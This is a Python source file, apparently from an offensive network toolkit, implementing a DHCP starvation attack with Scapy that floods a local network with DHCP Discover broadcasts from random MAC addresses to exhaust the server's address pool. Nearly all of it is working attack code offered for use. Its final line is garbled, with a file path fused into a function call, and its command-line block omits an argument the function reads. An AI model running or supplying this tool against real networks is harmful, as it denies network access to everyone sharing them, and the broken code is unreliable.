import sys
import os
from src.envena.config import scapy, Fatal_Error, Error_text, Clear, Success
from scapy.all import Ether, IP, BOOTP, DHCP, UDP
import time
from src.envena.functions import validate_args, rand_eth
from random import uniform, randint
dhcp_starve_v = 1.0
def dhcp_starve(args: dict)->None:
    if not validate_args(iface=args['iface'], timeout=args['timeout']): return()
    sent_packets = 0
    print(f'DHCP-starvation attack module, version {dhcp_starve_v}')
    iface = args['iface']
    try:
        print('*DHCP-starve started. Ctrl+C to stop')
        eth_src=rand_eth()
        scapy.hexdump(Ether(dst='ff:ff:ff:ff:ff:ff', src=eth_src)/
            IP(src='0.0.0.0', dst='255.255.255.255')/
            UDP(sport=68, dport=67)/
            BOOTP(
                op=1,  # BOOTREQUEST
                htype=1,  # Ethernet
                hlen=6,  # Длина MAC-адреса
                xid=randint(0, 0xFFFFFFFF),  # Случайный ID транзакции
                chaddr=bytes.fromhex(eth_src.replace(":", "")),  # MAC в бинарном формате
                flags=0x8000  # Broadcast флаг
            )/
            DHCP(options=[
                ('message-type', 'discover'),
                ('param_req_list', [1, 3, 6, 15, 31, 33]),  # Стандартные параметры
                'end'
            ])
        )
        while True:
            eth_src=rand_eth()
            ether = Ether(dst='ff:ff:ff:ff:ff:ff', src=eth_src)
            ip = IP(src='0.0.0.0', dst='255.255.255.255')
            udp = UDP(sport=68, dport=67)
            bootp = BOOTP(
                op=1,  # BOOTREQUEST
                htype=1,  # Ethernet
                hlen=6,  # MAC length
                xid=randint(0, 0xFFFFFFFF),  # Random XID
                chaddr=bytes.fromhex(eth_src.replace(":", "")),  # MAC in bin format
                flags=0x8000  # Broadcast
            )
            dhcp = DHCP(options=[
                ('message-type', 'discover'),
                ('param_req_list', [1, 3, 6, 15, 31, 33]),  # Base parameters
                'end'
            ])
            
            packet = ether/ip/udp/bootp/dhcp
            
            # Send packet
            try:
                scapy.sendp(packet, iface=iface, verbose=0)
                print(f"\r{sent_packets}. Sent DHCP Discover from MAC: {eth_src}", end='')
                sent_packets += 1
            except Exception as e:
                print(f"{Fatal_Error}Packet was not sent: {Error_text}{e}{Clear}")
            time.sleep(round(uniform(0, args['timeout']), 3))  # 0.5 is optimal
    except KeyboardInterrupt:
        print(f"\n\r{Success}{sent_packets} packet(s) sent.{Clear}")
        print('Aborted.')

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description=f"DHCP-starvation attack module. Version: {dhcp_starve_v}")
    parser.add_argument("-i", "--iface", required=True, help="Network interface.")
    arg = parser.parse_args()
    
    args = {'iface': arg.iface}

    dhcp_starve(args=argsenvena/src/modules/ethernet/tools/dhcp_starve.py )
